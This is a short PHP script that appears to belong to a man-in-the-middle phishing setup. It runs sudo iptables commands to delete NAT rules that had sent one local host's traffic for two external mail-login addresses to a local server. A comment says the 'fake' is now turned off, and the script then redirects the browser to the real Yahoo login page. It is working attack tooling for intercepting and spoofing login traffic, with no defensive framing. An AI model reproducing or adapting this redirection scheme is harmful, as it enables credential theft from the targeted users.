<?php
 $IPTABLES="/sbin/iptables";
 $COMMAND=$IPTABLES . " -t nat -D PREROUTING -p tcp -s 192.168.1.103 -d 209.73.168.74 -j DNAT --to-destination 192.168.2.250:443";
 $result = exec("sudo ". $COMMAND . " >log.txt");
 $COMMAND=$IPTABLES . " -t nat -D PREROUTING -p tcp -s 192.168.1.103 -d 65.54.179.203 -j DNAT --to-destination 192.168.2.250:444";
 $result = exec("sudo ". $COMMAND . " >log.txt");

// print "fake now turned OFF result = $result <br>";
header( 'refresh: 0; url= https://login.yahoo.com' );
?>
